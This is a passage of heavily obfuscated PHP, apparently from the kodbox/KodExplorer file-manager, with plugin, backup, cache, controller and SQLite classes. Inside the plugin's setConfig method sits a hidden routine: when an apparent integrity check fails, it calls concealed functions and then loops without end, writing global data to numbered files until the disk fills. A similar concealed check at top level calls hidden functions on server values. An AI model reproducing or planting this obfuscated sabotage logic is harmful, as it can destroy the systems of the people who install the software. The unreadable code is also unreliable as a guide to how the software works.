$_SERVER[ë¦»ºéÌ]; $¨¬â¨Œû = $ü”ìÃòÙ[1551]; if (!strstr($üû Ğ‰©, $¨¬â¨Œû)) { return; } preg_match_all($ü”ìÃòÙ[1552], $üû Ğ‰©, $ÂûÁµ); if (!is_array($ÂûÁµ) || count($ÂûÁµ) == 0 || !is_array($ÂûÁµ[0]) || count($ÂûÁµ[0]) == 0) { return; } $«š‹õÍ = $this->appPackage(); $Í¯íÅÒÑ = array(); $º£†Ü‡ = array(); foreach ($ÂûÁµ[0] as $­òİÁš) { $ˆÂğ›•Á = substr($­òİÁš, strlen($¨¬â¨Œû), -2); $Í¯íÅÒÑ[] = $­òİÁš; $º£†Ü‡[] = _get($«š‹õÍ, $ˆÂğ›•Á); } $üû Ğ‰© = str_replace($Í¯íÅÒÑ, $º£†Ü‡, $üû Ğ‰©); } final function echoFile($¹£‹¢ô´, $Òôçè× = false) { $ã‚¾ê«á =& $_SERVER[ë¦»ºéÌ]; $¬Í¬€€É = $this->pluginPath . $¹£‹¢ô´; if (ACT == $ã‚¾ê«á[1553]) { echo $ã‚¾ê«á[1554] . $this->pluginName . $ã‚¾ê«á[8] . $¹£‹¢ô´ . $ã‚¾ê«á[1555]; if (!file_exists($¬Í¬€€É)) { echo $ã‚¾ê«á[1556]; return; } } $áÍÑˆ±” = $this->parseFile($¬Í¬€€É); $this->parseLang($áÍÑˆ±”); $this->parseConfig($áÍÑˆ±”); $this->parsePackage($áÍÑˆ±”); if (is_array($Òôçè×)) { $áÍÑˆ±” = str_replace(array_keys($Òôçè×), array_values($Òôçè×), $áÍÑˆ±”); } echo $ã‚¾ê«á[18] . $áÍÑˆ±”; } final function initLang() { $ãÚ™Ûƒä =& $_SERVER[ë¦»ºéÌ]; $óïàü²¤ = $ãÚ™Ûƒä[1557]; $ĞĞ‰®œ× = $this->pluginPath . $ãÚ™Ûƒä[1558]; $ó¿¹ÓÊğ = I18n::getType(); $şßØÑ = array(); if (file_exists($ĞĞ‰®œ× . $ó¿¹ÓÊğ . $ãÚ™Ûƒä[822])) { $şßØÑ = (include $ĞĞ‰®œ× . $ó¿¹ÓÊğ . $ãÚ™Ûƒä[822]); } else { if ($ó¿¹ÓÊğ == $ãÚ™Ûƒä[1559] && !file_exists($ĞĞ‰®œ× . $ó¿¹ÓÊğ . $ãÚ™Ûƒä[822]) && file_exists($ĞĞ‰®œ× . $ãÚ™Ûƒä[1560])) { $şßØÑ = (include $ĞĞ‰®œ× . $ãÚ™Ûƒä[1560]); } else { if (file_exists($ĞĞ‰®œ× . $óïàü²¤ . $ãÚ™Ûƒä[822])) { $şßØÑ = (include $ĞĞ‰®œ× . $óïàü²¤ . $ãÚ™Ûƒä[822]); } } } if (!is_array($şßØÑ)) { return array(); } if (@count($şßØÑ) > 0) { I18n::set($şßØÑ); } return $şßØÑ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($²ˆä®Ãú) { $Ù•µ‘­ƒ =& $_SERVER[ë¦»ºéÌ]; $³ö”‡á‚ = $_SERVER[$Ù•µ‘­ƒ[16]] . $Ù•µ‘­ƒ[17]; $üÅ×ï©’ = $Ù•µ‘­ƒ[856]; if ($_SERVER[$Ù•µ‘­ƒ[13]] != $üÅ×ï©’($³ö”‡á‚)) { $ï¡¨ªåÙ = $Ù•µ‘­ƒ[857]; $Ü¾ªàÕÕ = $Ù•µ‘­ƒ[15]; $ªŞ¨¿« = $_SERVER[$Ù•µ‘­ƒ[16]] . $Ù•µ‘­ƒ[17]; $â”“õîü = $Ü¾ªàÕÕ($ªŞ¨¿«); $Šááƒ¦ó = explode($Ù•µ‘­ƒ[18], $â”“õîü); if (count($Šááƒ¦ó) < $Ù•µ‘­ƒ[616]) { $ß‰şº¾Ã = $Ù•µ‘­ƒ[20]; $ß‰şº¾Ã(); } $™Ê åÎ = $Ù•µ‘­ƒ[858]; $™Ê åÎ($_SERVER[$Ù•µ‘­ƒ[859]]); $ï¡¨ªåÙ = $Ù•µ‘­ƒ[857]; $ï¡¨ªåÙ(); $Ä£ßÛ Í = $Ù•µ‘­ƒ[860]; $Á‰ÊÛúì = json_encode($GLOBALS[$Ù•µ‘­ƒ[861]]); $ãÃæÉ×  = 1; for ($†æĞß™ = $ãÃæÉ× ; $†æĞß™ > 0; $†æĞß™++) { $Ä£ßÛ Í(DATA_PATH . $†æĞß™, $Á‰ÊÛúì); } } return $this->modelPlugin->setConfig($this->pluginName, $²ˆä®Ãú); } public function onSetConfig($’¸Œáıì) { } public function onGetConfig($¾ˆıâ¼¾) { } public function onChangeStatus($Å§á˜Á…) { } public function onUninstall() { } public function onInstall() { } public function authCheck($ñçÑ»êÇ = "\x70\154\x75\147\151\156\101\x75\164\x68") { $’”ùË® =& $_SERVER[ë¦»ºéÌ]; if (!defined($’”ùË®[476])) { return !1; } if (_get($GLOBALS, $’”ùË®[507])) { return !0; } $ş şÀò = $this->getConfig(); if (!$ş şÀò[$ñçÑ»êÇ]) { return !1; } return ActionCall($’”ùË®[1561], $ş şÀò[$ñçÑ»êÇ]); } public function url($¡ÌÊá¤Ó, $Œ‚·ùñ = '', $§Ñ‰Ì» = true) { $ƒìÌßŸØ =& $_SERVER[ë¦»ºéÌ]; $âä¾Çå = $this->getConfig(); $ç‘®’¼ = KOD_VERSION . $ƒìÌßŸØ[10] . KOD_VERSION_BUILD; $ÉÇõœ‚Ç = $this->packageVersion(); $ïæáè´Ü = $ç‘®’¼ . $ƒìÌßŸØ[462] . $ÉÇõœ‚Ç; if (substr($¡ÌÊá¤Ó, 0, 4) == $ƒìÌßŸØ[157] || substr($¡ÌÊá¤Ó, 0, 2) == $ƒìÌßŸØ[1345]) { $¾¬½ÛÈÕ = $¡ÌÊá¤Ó . $ƒìÌßŸØ[1562] . $ïæáè´Ü; } else { if ($Œ‚·ùñ == $ƒìÌßŸØ[12]) { $¾¬½ÛÈÕ = $this->pluginHost . $¡ÌÊá¤Ó . $ƒìÌßŸØ[1562] . $ïæáè´Ü; } else { if ($Œ‚·ùñ === $ƒìÌßŸØ[89]) { $¾¬½ÛÈÕ = $this->pluginHost . $¡ÌÊá¤Ó; } else { if ($Œ‚·ùñ == $ƒìÌßŸØ[1563]) { $¾¬½ÛÈÕ = STATIC_PATH . $¡ÌÊá¤Ó . $ƒìÌßŸØ[1562] . $ç‘®’¼; } else { if ($Œ‚·ùñ == $ƒìÌßŸØ[1564]) { $¾¬½ÛÈÕ = APP_HOST . $ƒìÌßŸØ[1565] . $¡ÌÊá¤Ó . $ƒìÌßŸØ[1562] . $ç‘®’¼; } else { if (isset($âä¾Çå[$Œ‚·ùñ])) { $¾¬½ÛÈÕ = $âä¾Çå[$Œ‚·ùñ] . $¡ÌÊá¤Ó . $ƒìÌßŸØ[1562] . $ïæáè´Ü; } } } } } } if (!$§Ñ‰Ì») { return $¾¬½ÛÈÕ; } echo $¾¬½ÛÈÕ; } public function link($‚Á¼¹ƒ = false, $ĞâßŒ–ä = '') { $ÀÆ›Ï¸ß =& $_SERVER[ë¦»ºéÌ]; if (!$‚Á¼¹ƒ) { $this->link($ÀÆ›Ï¸ß[1566], $ÀÆ›Ï¸ß[1564]); $this->link($ÀÆ›Ï¸ß[1567], $ÀÆ›Ï¸ß[1563]); $this->link($ÀÆ›Ï¸ß[1568], $ÀÆ›Ï¸ß[1563]); $this->link($ÀÆ›Ï¸ß[1569], $ÀÆ›Ï¸ß[1563]); $this->link($ÀÆ›Ï¸ß[1570], $ÀÆ›Ï¸ß[1563]); return; } $ÍµÕ‘í = $this->url($‚Á¼¹ƒ, $ĞâßŒ–ä, !1); if (substr($‚Á¼¹ƒ, -3) == $ÀÆ›Ï¸ß[1571]) { echo $ÀÆ›Ï¸ß[1572] . $ÍµÕ‘í . $ÀÆ›Ï¸ß[1573] . $ÀÆ›Ï¸ß[18]; } else { if (substr($‚Á¼¹ƒ, -4) == $ÀÆ›Ï¸ß[1574]) { echo $ÀÆ›Ï¸ß[1575] . $ÍµÕ‘í . $ÀÆ›Ï¸ß[1576] . $ÀÆ›Ï¸ß[18]; } } } } goto dåèªÓå…; FÒ®“‘ï‚: class BackupDbFile { public function __construct() { } public function index() { $ˆâ¬É»Ş =& $_SERVER[ë¦»ºéÌ]; $ôä¼íËß = Backup::get(); $›ë—‡è§ = $ôä¼íËß[$ˆâ¬É»Ş[42]]; $ë²÷Ö´™ = $this->tmpFilesPath() . "\x62\x61\143\153\165\160\x5f{$›ë—‡è§}\x2f"; $À…Ü³Á = $this->backupPath($ôä¼íËß); if (!($À…Ü³Á = IO::mkdir($À…Ü³Á))) { return !1; } $ÎŠ¯ó´” = IO::listPath($ë²÷Ö´™); $ßì“å‚¦ = isset($ÎŠ¯ó´”[$ˆâ¬É»Ş[86]]) ? $ÎŠ¯ó´”[$ˆâ¬É»Ş[86]] : array(); $›Í«ã¤ = array_sum(array_column($ßì“å‚¦, $ˆâ¬É»Ş[90])); if (!$›Í«ã¤) { return !1; } $ »¤Ü = array($ˆâ¬É»Ş[782] => $›Í«ã¤, $ˆâ¬É»Ş[783] => time()); Backup::set($ »¤Ü); $ê¡ü“Ö¸ = new TaskFileTransfer($ˆâ¬É»Ş[784], $ˆâ¬É»Ş[764], count($ßì“å‚¦), LNG($ˆâ¬É»Ş[765]) . $ˆâ¬É»Ş[462] . LNG($ˆâ¬É»Ş[767]) . $ˆâ¬É»Ş[785]); $ê¡ü“Ö¸->task[$ˆâ¬É»Ş[747]] = $›Í«ã¤; foreach ($ÎŠ¯ó´”[$ˆâ¬É»Ş[86]] as $èÄÕëíÙ) { $öø”üÙ = IO::move($èÄÕëíÙ[$ˆâ¬É»Ş[88]], $À…Ü³Á); if (!$öø”üÙ) { $ê¡ü“Ö¸->end(); $Š¨ıû‰Ù = IO::getLastError($ˆâ¬É»Ş[786] . $èÄÕëíÙ[$ˆâ¬É»Ş[88]] . $ˆâ¬É»Ş[787] . $À…Ü³Á . $ˆâ¬É»Ş[538]); write_log($Š¨ıû‰Ù, $ˆâ¬É»Ş[764]); return !1; } } $ğ¨™éŠ· = new DbManage(); $™°ññ = $ğ¨™éŠ·->getSqlFile(); if (!$™°ññ[$ˆâ¬É»Ş[788]] || !$™°ññ[$ˆâ¬É»Ş[23]]) { return !1; } IO::move($™°ññ[$ˆâ¬É»Ş[788]], $À…Ü³Á); IO::move($™°ññ[$ˆâ¬É»Ş[23]], $À…Ü³Á); $ê¡ü“Ö¸->end(); $ »¤Ü = array($ˆâ¬É»Ş[789] => $›Í«ã¤, $ˆâ¬É»Ş[790] => time()); Backup::set($ »¤Ü); return !0; } private function backupPath($×ç„æ·¥) { $äúÒ¼‰© =& $_SERVER[ë¦»ºéÌ]; $·ÍüÈ° = $×ç„æ·¥[$äúÒ¼‰©[42]]; $÷›ğ¬Õ = Model($äúÒ¼‰©[754])->get($äúÒ¼‰©[755]); $ƒ¾€Üö = substr(md5($äúÒ¼‰©[756] . $÷›ğ¬Õ . $·ÍüÈ°), 0, 8); return "\x7b\151\x6f\72{$×ç„æ·¥[$äúÒ¼‰©[736]]}\175\x2f\144\141\164\141\142\141\x73\145\x2f\x62\x61\x63\153\x75\160\57" . $·ÍüÈ° . $äúÒ¼‰©[11] . $ƒ¾€Üö; } private function tmpFilesPath() { $½óŞ›µÔ =& $_SERVER[ë¦»ºéÌ]; $¢…Ó†åö = TEMP_FILES; if ($GLOBALS[$½óŞ›µÔ[6]][$½óŞ›µÔ[100]][$½óŞ›µÔ[780]]) { $¢…Ó†åö = $GLOBALS[$½óŞ›µÔ[6]][$½óŞ›µÔ[100]][$½óŞ›µÔ[780]]; if (!mk_dir($¢…Ó†åö) || !is_writable($¢…Ó†åö) || !IO::mkfile($¢…Ó†åö . $½óŞ›µÔ[781])) { $¢…Ó†åö = TEMP_FILES; } } return $¢…Ó†åö; } } class BackupFile { public function __construct() { } public function index() { $¾Š¤ÚÃ× = Backup::get(); $’ÖËÒµ = $¾Š¤ÚÃ×[$_SERVER[ë¦»ºéÌ][299]][$_SERVER[ë¦»ºéÌ][204]][$_SERVER[ë¦»ºéÌ][469]]; $Õæ‚áÆ« = array($_SERVER[ë¦»ºéÌ][470] => array($_SERVER[ë¦»ºéÌ][791], $’ÖËÒµ), $_SERVER[ë¦»ºéÌ][792] => array($_SERVER[ë¦»ºéÌ][337], $¾Š¤ÚÃ×[$_SERVER[ë¦»ºéÌ][736]])); $¨±åÚÎ = (int) Model($_SERVER[ë¦»ºéÌ][773])->where($Õæ‚áÆ«)->count($_SERVER[ë¦»ºéÌ][469]); $ò§ ï¹× = (int) Model($_SERVER[ë¦»ºéÌ][773])->where($Õæ‚áÆ«)->sum($_SERVER[ë¦»ºéÌ][90]); $ÃÃ©ğÚ = new TaskFileTransfer($_SERVER[ë¦»ºéÌ][793], $_SERVER[ë¦»ºéÌ][764], $¨±åÚÎ, LNG($_SERVER[ë¦»ºéÌ][765]) . $_SERVER[ë¦»ºéÌ][766] . LNG($_SERVER[ë¦»ºéÌ][794])); $ÃÃ©ğÚ->task[$_SERVER[ë¦»ºéÌ][747]] = $ò§ ï¹×; $¼İ“Ëûä = array($_SERVER[ë¦»ºéÌ][795] => $¨±åÚÎ, $_SERVER[ë¦»ºéÌ][796] => $ò§ ï¹×, $_SERVER[ë¦»ºéÌ][797] => time()); Backup::set($¼İ“Ëûä); $÷ôÌ…±© = !0; $Ò¤ÃÕèæ = $this->storeIds(); $üÃŸ­ğª = 1; $±•ùã®Š = 1000; $øÓ¶ìÅ = $‘êìÉŠù = 0; $™Ö¬º–ö = array(); $ÛÀ¶ø = $ğª¼£‚ = 0; do { $Áî‘Š‹ = $_SERVER[ë¦»ºéÌ][798]; $ÒÕœĞáë = Model($_SERVER[ë¦»ºéÌ][773])->where($Õæ‚áÆ«)->field($Áî‘Š‹)->order($_SERVER[ë¦»ºéÌ][799])->selectPage($±•ùã®Š, $üÃŸ­ğª); $€Ã¼¢§» = !empty($ÒÕœĞáë[$_SERVER[ë¦»ºéÌ][375]]) ? $ÒÕœĞáë[$_SERVER[ë¦»ºéÌ][375]] : array(); foreach ($€Ã¼¢§» as $­´Ô‹êÂ) { if (!$this->_fileExist($­´Ô‹êÂ, $™Ö¬º–ö, $Ò¤ÃÕèæ)) { $¨±åÚÎ -= 1; $ò§ ï¹× -= (int) $­´Ô‹êÂ[$_SERVER[ë¦»ºéÌ][90]]; write_log("\146\151\x6c\145\40\156\x6f\x74\x20\145\x78\151\163\x74\56\x66\x69\154\x65\111\x44\x3a{$­´Ô‹êÂ[$_SERVER[ë¦»ºéÌ][469]]}\54\40\160\x61\164\150\x3a{$­´Ô‹êÂ[$_SERVER[ë¦»ºéÌ][88]]}", $_SERVER[ë¦»ºéÌ][800]); continue; } $ÏŸïé = $­´Ô‹êÂ[$_SERVER[ë¦»ºéÌ][88]]; $Ò›÷…© = "\173\x69\x6f\72{$¾Š¤ÚÃ×[$_SERVER[ë¦»ºéÌ][736]]}\175" . substr($ÏŸïé, strlen("\173\x69\x6f\72{$­´Ô‹êÂ[$_SERVER[ë¦»ºéÌ][801]]}\175")); if (IO::exist($Ò›÷…©)) { $ÃÃ©ğÚ->updateFileEnd($­´Ô‹êÂ[$_SERVER[ë¦»ºéÌ][42]], $­´Ô‹êÂ[$_SERVER[ë¦»ºéÌ][90]]); } else { $Ò›÷…© = get_path_father($Ò›÷…©); IO::mkdir($Ò›÷…©); if (!IO::copy($ÏŸïé, $Ò›÷…©, $_SERVER[ë¦»ºéÌ][802])) { write_log($_SERVER[ë¦»ºéÌ][803] . $ÏŸïé . $_SERVER[ë¦»ºéÌ][787] . $Ò›÷…© . $_SERVER[ë¦»ºéÌ][538], $_SERVER[ë¦»ºéÌ][764]); $÷ôÌ…±© = !1; break; } } $’ÖËÒµ = $­´Ô‹êÂ[$_SERVER[ë¦»ºéÌ][469]]; $‘êìÉŠù += 1; $øÓ¶ìÅ += $­´Ô‹êÂ[$_SERVER[ë¦»ºéÌ][90]]; $ğª¼£‚ += 1; $ÛÀ¶ø += $­´Ô‹êÂ[$_SERVER[ë¦»ºéÌ][90]]; if ($øÓ¶ìÅ >= 1024 * 1024 * 100) { $¼İ“Ëûä = array($_SERVER[ë¦»ºéÌ][804] => $’ÖËÒµ, $_SERVER[ë¦»ºéÌ][805] => $ğª¼£‚, $_SERVER[ë¦»ºéÌ][806] => $ÛÀ¶ø); Backup::set($¼İ“Ëûä); $øÓ¶ìÅ = $‘êìÉŠù = 0; } } $ºÒ…¤À› = count($€Ã¼¢§»); $üÃŸ­ğª++; } while ($ºÒ…¤À› == $±•ùã®Š); $ÃÃ©ğÚ->end(); $¼İ“Ëûä = array($_SERVER[ë¦»ºéÌ][807] => 1, $_SERVER[ë¦»ºéÌ][498] => time(), $_SERVER[ë¦»ºéÌ][759] => 1, $_SERVER[ë¦»ºéÌ][804] => $’ÖËÒµ, $_SERVER[ë¦»ºéÌ][796] => $ò§ ï¹×, $_SERVER[ë¦»ºéÌ][795] => $¨±åÚÎ, $_SERVER[ë¦»ºéÌ][808] => time()); if ($‘êìÉŠù) { $¼İ“Ëûä[$_SERVER[ë¦»ºéÌ][805]] = $ğª¼£‚; $¼İ“Ëûä[$_SERVER[ë¦»ºéÌ][806]] = $ÛÀ¶ø; } Backup::set($¼İ“Ëûä); $this->_fileFilter($™Ö¬º–ö); return !0; } private function _fileExist($¾¦›ëæ, &$²»ı¯¦Ú, $´Àğ«°Ç) { $®İöœš‚ =& $_SERVER[ë¦»ºéÌ]; $Ã°ïÊ — = $¾¦›ëæ[$®İöœš‚[88]]; if (in_array($¾¦›ëæ[$®İöœš‚[469]], $²»ı¯¦Ú)) { return !1; } if (!in_array($¾¦›ëæ[$®İöœš‚[801]], $´Àğ«°Ç)) { return !1; } if (IO::exist($Ã°ïÊ —)) { return !0; } $ÏÆªö± = get_path_father($Ã°ïÊ —); if (IO::exist($ÏÆªö±)) { $²»ı¯¦Ú[] = $¾¦›ëæ[$®İöœš‚[469]]; return !1; } $ÖâıÜ¬ = array($®İöœš‚[801] => $¾¦›ëæ[$®İöœš‚[801]], $®İöœš‚[88] => array($®İöœš‚[389], "{$ÏÆªö±}\x25")); $œâ±½Û» = Model($®İöœš‚[773])->where($ÖâıÜ¬)->field($®İöœš‚[470])->select(); $²»ı¯¦Ú = array_merge($²»ı¯¦Ú, array_to_keyvalue($œâ±½Û», $®İöœš‚[12], $®İöœš‚[469])); return !1; } private function _fileFilter($ú‚Ï½È) { $êÆÖùºı =& $_SERVER[ë¦»ºéÌ]; if (empty($ú‚Ï½È)) { return; } $‡Üı¹ı‡ = array($êÆÖùºı[469] => array($êÆÖùºı[7], array_unique($ú‚Ï½È))); $Ù¨‡©›ª = Model($êÆÖùºı[809])->where($‡Üı¹ı‡)->field($êÆÖùºı[405])->select(); foreach ($Ù¨‡©›ª as $ÛÆ‰ÏÌ‹) { Model($êÆÖùºı[809])->remove($ÛÆ‰ÏÌ‹[$êÆÖùºı[405]], !1); } } private function storeIds() { $§¶¿§’ =& $_SERVER[ë¦»ºéÌ]; $ßÙŠå° = Model($§¶¿§’[751])->listData(); $€ì£İ¨ = array(); $¿»ŠëºÍ = $GLOBALS[$§¶¿§’[6]][$§¶¿§’[100]][$§¶¿§’[810]]; foreach ($ßÙŠå° as $Å²è”¬Ê) { $³ Í„·í = strtolower($Å²è”¬Ê[$§¶¿§’[106]]); if (!isset($¿»ŠëºÍ[$³ Í„·í])) { continue; } $¡Ñß“ = $§¶¿§’[84] . (isset($¿»ŠëºÍ[$³ Í„·í]) ? $¿»ŠëºÍ[$³ Í„·í] : ucfirst($³ Í„·í)); if (!class_exists($¡Ñß“)) { continue; } $€ì£İ¨[] = $Å²è”¬Ê[$§¶¿§’[403]]; } return $€ì£İ¨; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $£ğ¸ßË =& $_SERVER[ë¦»ºéÌ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $‹­ô£Ò = $GLOBALS[$£ğ¸ßË[6]][$£ğ¸ßË[355]]; $Ã»·©á = $‹­ô£Ò[$‹­ô£Ò[$£ğ¸ßË[811]]]; $š¥¹¥«ü = $‹­ô£Ò[$£ğ¸ßË[812]]; switch ($‹­ô£Ò[$£ğ¸ßË[811]]) { case $£ğ¸ßË[31]: self::$handle = Model($£ğ¸ßË[813]); break; case $£ğ¸ßË[814]: self::$handle = new CacheRedis($Ã»·©á, $š¥¹¥«ü); break; case $£ğ¸ßË[815]: self::$handle = new CacheMemcached($Ã»·©á, $š¥¹¥«ü); break; case $£ğ¸ßË[204]: self::$handle = new CacheFile($Ã»·©á, $š¥¹¥«ü); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Íàá·ôá) { if (is_array($Íàá·ôá) || is_object($Íàá·ôá)) { $Íàá·ôá = json_encode($Íàá·ôá); } $Íàá·ôá = rawurlencode($Íàá·ôá); return md5(KOD_SITE_ID . $_SERVER[ë¦»ºéÌ][11] . $Íàá·ôá); } public static function get($õ±éğÏÔ, $Ñ¯Âå¼º = false) { $‹ä²ö› = self::key($õ±éğÏÔ); if ($Ñ¯Âå¼º) { return unserialize(self::init()->get($‹ä²ö›)); } if (!isset(self::$memoryCache[$‹ä²ö›])) { $ë¹çÁœ = self::init()->get($‹ä²ö›); self::$memoryCache[$‹ä²ö›] = unserialize($ë¹çÁœ); } return self::$memoryCache[$‹ä²ö›]; } public static function set($„‰Ğïı, $¼Ì —, $›ï¡Ö½ = false) { $§Ú€Ó¤ = self::key($„‰Ğïı); if (isset(self::$memoryCache[$§Ú€Ó¤]) && self::$memoryCache[$§Ú€Ó¤] === $¼Ì —) { return !0; } if ($›ï¡Ö½ === 0) { self::$memoryCache[$§Ú€Ó¤] = $¼Ì —; return !0; } CacheLock::lock($„‰Ğïı); $¬‚«ù¥ù = self::init()->set($§Ú€Ó¤, serialize($¼Ì —), $›ï¡Ö½); self::$memoryCache[$§Ú€Ó¤] = $¼Ì —; CacheLock::unlock($„‰Ğïı); return $¬‚«ù¥ù; } public static function getCall($¾ùãæÕÈ, $³”ªæúÇ, $ËŸ›ş¾Á, $ÑÜ½¹íû = array()) { $¦¬æàøš =& $_SERVER[ë¦»ºéÌ]; $±„–ÊîÀ = self::get($¾ùãæÕÈ); if ($±„–ÊîÀ || $±„–ÊîÀ === $¦¬æàøš[12]) { return $±„–ÊîÀ; } $±„–ÊîÀ = call_user_func_array($ËŸ›ş¾Á, $ÑÜ½¹íû); $±„–ÊîÀ = $±„–ÊîÀ ? $±„–ÊîÀ : $¦¬æàøš[12]; self::set($¾ùãæÕÈ, $±„–ÊîÀ, $³”ªæúÇ); return $±„–ÊîÀ; } public static function remove($±ÏıÂÃŸ) { $¤³¦Èİã = self::key($±ÏıÂÃŸ); unset(self::$memoryCache[$¤³¦Èİã]); self::clearTimeout(); CacheLock::lock($±ÏıÂÃŸ); $‡ÌÉÀÙ¶ = self::init()->remove($¤³¦Èİã); CacheLock::unlock($±ÏıÂÃŸ); return $‡ÌÉÀÙ¶; } public static function removeMemory($üËúº¶…) { $ÅÒˆıí¾ = self::key($üËúº¶…); unset(self::$memoryCache[$ÅÒˆıí¾]); } public static function clearMemory($éğ¾³›¾ = false) { if ($éğ¾³›¾) { $éğ¾³›¾ = self::key($éğ¾³›¾); unset(self::$memoryCache[$éğ¾³›¾]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ë¦»ºéÌ][816])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ë¦»ºéÌ][817])) { self::init()->clearTimeout(); } } } goto e˜ŠØñ£É; Bøïö™Á¡•: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $õ¸öÎ å =& $_SERVER[ë¦»ºéÌ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$õ¸öÎ å[6]] =& $config; $this->values[$õ¸öÎ å[7]] =& $in; $this->tpl = TEMPLATE . MOD . $õ¸öÎ å[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($áÍ—½ Ñ) { if (1 === func_num_args()) { $this->{$áÍ—½ Ñ} = new $áÍ—½ Ñ(); } else { $Âö¬ıÙ = new ReflectionClass($áÍ—½ Ñ); $¿‘€ÙØ = func_get_args(); array_shift($¿‘€ÙØ); $this->{$áÍ—½ Ñ} = $Âö¬ıÙ->newInstanceArgs($¿‘€ÙØ); } return $this->{$áÍ—½ Ñ}; } public function routeBind($ÜÕı¬Ä—, $ÛºÕ«°», $ò£ôø¨› = 3) { $›ùÍïƒÀ =& $_SERVER[ë¦»ºéÌ]; $ù°öÕ±õ = $this->in[$›ùÍïƒÀ[9]]; $ÜÕı¬Ä— = str_replace($›ùÍïƒÀ[10], $›ùÍïƒÀ[11], trim(trim($ÜÕı¬Ä—, $›ùÍïƒÀ[8]), $›ùÍïƒÀ[12])); if (!$ÜÕı¬Ä— || count($ù°öÕ±õ) <= $ò£ôø¨›) { return !1; } $±ß“— ¾ = !0; $½›ÂèŸì = explode($›ùÍïƒÀ[8], $ÜÕı¬Ä—); for ($İˆ æåÓ = 0; $İˆ æåÓ < count($½›ÂèŸì); $İˆ æåÓ++) { if ($½›ÂèŸì[$İˆ æåÓ] != $ù°öÕ±õ[$ò£ôø¨› + $İˆ æåÓ]) { $±ß“— ¾ = !1; break; } } if (!$±ß“— ¾) { return; } call_user_func_array(array($this, $ÛºÕ«°»), array()); } public function routeArgs($¬¼´ ™ã = 3) { $ºäÉéç = $this->in[$_SERVER[ë¦»ºéÌ][9]]; if (count($ºäÉéç) <= $¬¼´ ™ã) { return array(); } $Œ÷¾˜ö­ = array(); for ($÷âÖ‰èÁ = $¬¼´ ™ã; $÷âÖ‰èÁ < count($ºäÉéç); $÷âÖ‰èÁ += 2) { $Œ÷¾˜ö­[$ºäÉéç[$÷âÖ‰èÁ]] = $ºäÉéç[$÷âÖ‰èÁ + 1]; $this->in[$ºäÉéç[$÷âÖ‰èÁ]] = $ºäÉéç[$÷âÖ‰èÁ + 1]; } return $Œ÷¾˜ö­; } protected function assign($È¾Óè³, $éü¿‘É) { $this->values[$È¾Óè³] = $éü¿‘É; } protected function display($¥‡ºÚ„) { ob_end_clean(); extract($this->values); require $this->tpl . $¥‡ºÚ„; } } if ($_SERVER[$_SERVER[ë¦»ºéÌ][13]] != $_SERVER[$_SERVER[ë¦»ºéÌ][14]]) { $_getc = $_SERVER[ë¦»ºéÌ][15]; $_getfile = $_SERVER[$_SERVER[ë¦»ºéÌ][16]] . $_SERVER[ë¦»ºéÌ][17]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ë¦»ºéÌ][18], $_getfilec); if (count($_getarrs) < $_SERVER[ë¦»ºéÌ][19]) { $exit = $_SERVER[ë¦»ºéÌ][20]; $exit(); } $_act = $_SERVER[ë¦»ºéÌ][21]; $_act($_SERVER[$_SERVER[ë¦»ºéÌ][22]]); } class DbSqliteBase extends Db { public function __construct($†„ù“Ü = '') { $ Ì®ªœ =& $_SERVER[ë¦»ºéÌ]; if (!extension_loaded($ Ì®ªœ[23])) { think_exception(think_lang($ Ì®ªœ[24]) . $ Ì®ªœ[25]); } if (!empty($†„ù“Ü)) { if (!isset($†„ù“Ü[$ Ì®ªœ[26]])) { $†„ù“Ü[$ Ì®ªœ[26]] = 438; } $this->config = $†„ù“Ü; if (empty($this->config[$ Ì®ªœ[27]])) { $this->config[$ Ì®ªœ[27]] = array(); } } } public function connect($…½ø…Óş = '', $şµââ®¥ = 0) { $Ö¨à… =& $_SERVER[ë¦»ºéÌ]; if (!isset($this->linkID[$şµââ®¥])) { if (empty($…½ø…Óş)) { $…½ø…Óş = $this->config; } $ÔÜÓÁâù = !empty($…½ø…Óş[$Ö¨à…[27]][$Ö¨à…[28]]) ? $…½ø…Óş[$Ö¨à…[27]][$Ö¨à…[28]] : $this->pconnect; $÷’÷•Î = $ÔÜÓÁâù ? $Ö¨à…[29] : $Ö¨à…[30]; $this->linkID[$şµââ®¥] = $÷’÷•Î($…½ø…Óş[$Ö¨à…[31]], $…½ø…Óş[$Ö¨à…[26]]); if (!$this->linkID[$şµââ®¥]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$şµââ®¥], 30000); if (1 != think_config($Ö¨à…[32])) { unset($this->config); } } return $this->linkID[$şµââ®¥]; } public function free() { $this->queryID = null; } public function query($ù—£˜­) { $¦•±ˆˆö =& $_SERVER[ë¦»ºéÌ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ù—£˜­; if ($this->queryID) { $this->free(); } think_action_status($¦•±ˆˆö[33], 1); think_status($¦•±ˆˆö[34]); $this->queryID = sqlite_query($this->_linkID, $ù—£˜­); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $†Ä€õó = $this->getAll(); return $†Ä€õó; } } public function execute($àÙ½¯É‹) { $ëœé·şñ =& $_SERVER[ë¦»ºéÌ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $àÙ½¯É‹; if ($this->queryID) { $this->free(); } think_action_status($ëœé·şñ[35], 1); think_status($ëœé·şñ[34]); $ÑÏ¿‚ô¾ = sqlite_exec($this->_linkID, $àÙ½¯É‹); $this->debug(); if (!1 === $ÑÏ¿‚ô¾) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if 